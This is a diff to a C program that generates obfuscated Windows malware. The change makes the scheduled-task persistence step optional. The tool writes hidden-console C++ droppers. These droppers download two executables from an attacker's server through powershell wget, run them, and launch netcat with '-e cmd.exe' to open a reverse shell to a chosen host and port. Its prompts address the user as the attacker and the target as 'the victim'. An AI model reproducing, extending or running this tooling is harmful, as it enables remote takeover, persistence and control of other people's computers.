@@ -3,6 +3,7 @@
 #include <stdio.h>
 #include <string.h>
 #include <unistd.h>
+
 #define SOURCE_CODE "#include <iostream>\n#include <windows.h>\n#include <string>\nint main(int argc, char *argv[])\n{\nShowWindow(GetConsoleWindow(), SW_HIDE);\nsystem("
 void get(char *prompt, char *str, int size)
 {
@@ -52,7 +53,7 @@ void obfuscate(char *tmp_file_name, char *cmd_non_obfuscate)
     char cmd[100][10000];
     char source_code[10000];
     char random_variable[2000];
-    char alphabet[100] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789 .-><:'()/&";
+    char alphabet[100] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789 .-><:'()/&^";
     source_code[0] = '\0';
     strcat(source_code, "#include <iostream>\n#include <windows.h>\n#include <string>\nint main(int argc, char *argv[])\n{\nShowWindow(GetConsoleWindow(), SW_HIDE);\n");
     c_TMP = fopen(tmp_file_name, "w+");
@@ -92,23 +93,30 @@ void obfuscate(char *tmp_file_name, char *cmd_non_obfuscate)
     fputs(source_code, c_TMP);
     fclose(c_TMP);
 }
-void generatePayload(char *victim_dir, char *file_provider, char *first_file_provided, char *second_file_provided, char *task_name, char *task_trigger, char *payload_name)
+void generatePayload(char *victim_dir, char *file_provider, char *first_file_provided, char *second_file_provided, char *task_state, char *task_name, char *task_trigger, char *payload_name)
 {
     char cmd_PAYLOAD[2000];
     cmd_PAYLOAD[0] = '\0';
+
     strcat(cmd_PAYLOAD, "c: & cd / & mkdir ");
     strcat(cmd_PAYLOAD, victim_dir);
     strcat(cmd_PAYLOAD, " & cd ");
     strcat(cmd_PAYLOAD, victim_dir);
-    strcat(cmd_PAYLOAD, " & schtasks /create /tn ");
-    strcat(cmd_PAYLOAD, task_name);
-    strcat(cmd_PAYLOAD, " /tr ");
-    strcat(cmd_PAYLOAD, victim_dir);
-    strcat(cmd_PAYLOAD, "/");
-    strcat(cmd_PAYLOAD, first_file_provided);
-    strcat(cmd_PAYLOAD, ".exe ");
-    strcat(cmd_PAYLOAD, task_trigger);
-    strcat(cmd_PAYLOAD, " /f & powershell.exe (wget 'http://");
+
+    if (strcmp(task_state, "y") == 0 || strcmp(task_state, "Y") == 0)
+    {
+        strcat(cmd_PAYLOAD, " & schtasks /create /tn ");
+        strcat(cmd_PAYLOAD, task_name);
+        strcat(cmd_PAYLOAD, " /tr ");
+        strcat(cmd_PAYLOAD, victim_dir);
+        strcat(cmd_PAYLOAD, "/");
+        strcat(cmd_PAYLOAD, first_file_provided);
+        strcat(cmd_PAYLOAD, ".exe ");
+        strcat(cmd_PAYLOAD, task_trigger);
+        strcat(cmd_PAYLOAD, " /f ");
+    }
+
+    strcat(cmd_PAYLOAD, "& powershell.exe (wget 'http://");
     strcat(cmd_PAYLOAD, file_provider);
     strcat(cmd_PAYLOAD, "/");
     strcat(cmd_PAYLOAD, first_file_provided);
@@ -122,7 +130,8 @@ void generatePayload(char *victim_dir, char *file_provider, char *first_file_pro
     strcat(cmd_PAYLOAD, second_file_provided);
     strcat(cmd_PAYLOAD, ".exe) & ");
     strcat(cmd_PAYLOAD, first_file_provided);
-    strcat(cmd_PAYLOAD, ".exe & exit\"");
+    strcat(cmd_PAYLOAD, ".exe & exit");
+
     obfuscate("c_TMP_PAYLOAD.cpp", cmd_PAYLOAD);
     compile("c_TMP_PAYLOAD.cpp", payload_name, "PAYLOAD");
 }
@@ -130,6 +139,7 @@ void generateExtension(char *victim_dir, char *host, char *port, char *second_fi
 {
     char cmd_EXTENSION[2000];
     cmd_EXTENSION[0] = '\0';
+
     strcat(cmd_EXTENSION, "START /MIN ");
     strcat(cmd_EXTENSION, victim_dir);
     strcat(cmd_EXTENSION, "/");
@@ -139,10 +149,12 @@ void generateExtension(char *victim_dir, char *host, char *port, char *second_fi
     strcat(cmd_EXTENSION, " ");
     strcat(cmd_EXTENSION, port);
     strcat(cmd_EXTENSION, " -e cmd.exe -d ^");
+
     obfuscate("c_TMP_EXTENSION.cpp", cmd_EXTENSION);
     compile("c_TMP_EXTENSION.cpp", first_file_provided, "FILE_A");
 }
-void generateNc(char *second_file_provided){
+void generateNc(char *second_file_provided)
+{
     char cmd_NC[2000];
     cmd_NC[0] = '\0';
     printf("Creating %s ...\n", second_file_provided);
@@ -172,6 +184,7 @@ int main(int argc, char **argv)
     char host[255];
     char port[255];
     char task_name[255];
+    char task_state[255];
     char task_trigger[255];
     char task_number[255];
     int cli_mode_enabled = 0;
@@ -225,7 +238,9 @@ int main(int argc, char **argv)
         if (strlen(file_provider) > 0 && strlen(host) > 0 && strlen(port) > 0)
         {
             cli_mode_enabled = 1;
-        }else{
+        }
+        else
+        {
             printf("Input Error.");
             return 0;
         }
@@ -248,62 +263,66 @@ int main(int argc, char **argv)
                     {
                         strcpy(victim_dir, "C:\\System");
                     }
-                    get("Please enter the name for the system task you want to create to the victim [default : 'TaskSystem']: ", task_name, 255);
-                    if (strlen(task_name) == 0)
+                    get("Do you want to create a tasksystem ? [y/n]", task_state, 255);
+                    if (strcmp(task_state, "y") == 0 || strcmp(task_state, "Y") == 0)
                     {
-                        strcpy(task_name, "TaskSystem");
-                    }
-                    while (strcmp(task_trigger, "1") != 0 || strcmp(task_trigger, "2") != 0 || strcmp(task_trigger, "3") == 0 || strcmp(task_trigger, "4") == 0 || strcmp(task_trigger, "5") == 0 || strcmp(task_trigger, "6") == 0)
-                    {
-                        printf("1 - MINUTE - Run the task on specified minutes.\n");
-                        printf("2 - HOURLY - Run the task on specified hours.\n");
-                        printf("3 - DAILY - Run the task on specified day.\n");
-                        printf("4 - ONSTART - Run the task on startup.\n");
-                        printf("5 - ONLOGON - Run the task on longon.\n");
-                        printf("6 - ONIDLE - Run the task on idle.\n");
-                        get("Please enter the time of recursive call for the system task you want to create to the victim [default : 'minutes']: ", task_trigger, 255);
-                        if (strlen(task_trigger) == 0)
+                        get("Please enter the name for the system task you want to create to the victim [default : 'TaskSystem']: ", task_name, 255);
+                        if (strlen(task_name) == 0)
                         {
-                            strcpy(task_trigger, "/sc minute /MO 5");
-                            break;
+                            strcpy(task_name, "TaskSystem");
                         }
-                        else if (strcmp(task_trigger, "1") == 0)
+                        while (strcmp(task_trigger, "1") != 0 || strcmp(task_trigger, "2") != 0 || strcmp(task_trigger, "3") == 0 || strcmp(task_trigger, "4") == 0 || strcmp(task_trigger, "5") == 0 || strcmp(task_trigger, "6") == 0)
                         {
-                            strcpy(task_trigger, "/sc minute /MO ");
-                            get("How many minutes ? : ", task_number, 10);
-                            strcat(task_trigger, task_number);
-                            break;
-                        }
-                        else if (strcmp(task_trigger, "2") == 0)
-                        {
-                            strcpy(task_trigger, "/sc hour /MO ");
-                            get("How many hours ? : ", task_number, 10);
-                            strcat(task_trigger, task_number);
-                            break;
-                        }
-                        else if (strcmp(task_trigger, "3") == 0)
-                        {
-                            strcpy(task_trigger, "/sc daily /MO  ");
-                            get("How many days ? : ", task_number, 10);
-                            strcat(task_trigger, task_number);
-                            break;
-                        }
-                        else if (strcmp(task_trigger, "4") == 0)
-                        {
-                            strcpy(task_trigger, "/SC ONSTART");
-                            break;
-                        }
-                        else if (strcmp(task_trigger, "5") == 0)
-                        {
-                            strcpy(task_trigger, "/SC ONLOGON");
-                            break;
-                        }
-                        else if (strcmp(task_trigger, "6") == 0)
-                        {
-                            strcpy(task_trigger, "/sc onidle /I ");
-                            get("How many idle time ? : ", task_number, 10);
-                            strcat(task_trigger, task_number);
-                            break;
+                            printf("1 - MINUTE - Run the task on specified minutes.\n");
+                            printf("2 - HOURLY - Run the task on specified hours.\n");
+                            printf("3 - DAILY - Run the task on specified day.\n");
+                            printf("4 - ONSTART - Run the task on startup.\n");
+                            printf("5 - ONLOGON - Run the task on longon.\n");
+                            printf("6 - ONIDLE - Run the task on idle.\n");
+                            get("Please enter the time of recursive call for the system task you want to create to the victim [default : 'minutes']: ", task_trigger, 255);
+                            if (strlen(task_trigger) == 0)
+                            {
+                                strcpy(task_trigger, "/sc minute /MO 1");
+                                break;
+                            }
+                            else if (strcmp(task_trigger, "1") == 0)
+                            {
+                                strcpy(task_trigger, "/sc minute /MO ");
+                                get("How many minutes ? : ", task_number, 10);
+                                strcat(task_trigger, task_number);
+                                break;
+                            }
+                            else if (strcmp(task_trigger, "2") == 0)
+                            {
+                                strcpy(task_trigger, "/sc hour /MO ");
+                                get("How many hours ? : ", task_number, 10);
+                                strcat(task_trigger, task_number);
+                                break;
+                            }
+                            else if (strcmp(task_trigger, "3") == 0)
+                            {
+                                strcpy(task_trigger, "/sc daily /MO  ");
+                                get("How many days ? : ", task_number, 10);
+                                strcat(task_trigger, task_number);
+                                break;
+                            }
+                            else if (strcmp(task_trigger, "4") == 0)
+                            {
+                                strcpy(task_trigger, "/SC ONSTART");
+                                break;
+                            }
+                            else if (strcmp(task_trigger, "5") == 0)
+                            {
+                                strcpy(task_trigger, "/SC ONLOGON");
+                                break;
+                            }
+                            else if (strcmp(task_trigger, "6") == 0)
+                            {
+                                strcpy(task_trigger, "/sc onidle /I ");
+                                get("How many idle time ? : ", task_number, 10);
+                                strcat(task_trigger, task_number);
+                                break;
+                            }
                         }
                     }
                     get("Please enter your server (who provide the files) adress [example : 10.0.0.1/RES or provider.com]: ", file_provider, 255);
@@ -373,7 +392,8 @@ int main(int argc, char **argv)
     printf("FILES PROVIDED : %s and %s\n", first_file_provided, second_file_provided);
     printf("HOST PROVIDED : %s\n", host);
     printf("PORT PROVIDED : %s\n", port);
-    generatePayload(victim_dir, file_provider, first_file_provided, second_file_provided, task_name, task_trigger, payload_name);
+    printf("CREATING TASK : %s\n", task_state);
+    generatePayload(victim_dir, file_provider, first_file_provided, second_file_provided, task_state, task_name, task_trigger, payload_name);
     generateExtension(victim_dir, host, port, second_file_provided, first_file_provided);
     generateNc(second_file_provided);
     printf("Now you just have to place %s.exe and %s.exe here %s, share %s.exe and start your listener.\nHappy hunting !!", first_file_provided, second_file_provided, file_provider, payload_name);
